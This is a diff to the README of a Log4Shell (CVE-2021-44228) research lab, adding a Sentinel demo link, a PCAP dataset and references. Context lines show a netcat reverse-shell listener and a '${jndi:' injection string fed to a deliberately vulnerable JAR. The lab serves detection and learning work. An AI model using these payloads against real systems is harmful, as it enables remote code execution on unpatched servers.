@@ -1,6 +1,10 @@
 # CVE-2021-44228 Log4Shell Research Lab 🚧
 
-A basic lab environment to test some of the public proof of concepts to trigger and learn more about [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and expedite the time it takes to deploy multiple scenarios.
+A basic lab environment to test some of the public proof of concepts to trigger and learn more about [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+
+## Used By
+
+* [Microsoft Sentinel To-Go! CVE-2021-44228-Log4Shell Demo](https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell)
 
 ## Deploy LDAP Reference & Web Servers
 
@@ -36,13 +40,13 @@ nc -lvnp 443
 ```
 ### Compile Basic JAR
 
-**Dockerized**
+**Docker**
 ```
 cd vulnApps/basicJar
 docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
 ```
 
-**Locally**
+**Manual**
 ```
 cd vulnApps/basicJar
 mvn -f pom.xml clean package -DskipTests
@@ -57,6 +61,10 @@ java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:
 
 ![](resources/images/log4jshell-trigger-rce-basicjar-reverseshell3.png)
 
+## Seurity Datasets
+
+* [Basic JNDI Lookup PCAP](https://securitydatasets.com/notebooks/atomic/linux/initial_access/SDLIN-211214154100.html)
+
 ## References
 * https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
 * https://www.youtube.com/watch?v=Y8a5nB-vy78
@@ -70,3 +78,6 @@ java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:
 * https://www.ibm.com/docs/en/content-manager/8.5.0?topic=ldap-server-configuration-storing-java-objects
 * https://docs.microsoft.com/en-us/windows/win32/ad/enabling-schema-changes-at-the-schema-master
 * https://forensicitguy.github.io/analyzing-log4shell-muhstik/
+* https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
+* https://www.jackson-t.ca/runtime-exec-payloads.html
+* https://github.com/woodpecker-appstore/log4j-payload-generator/tree/master
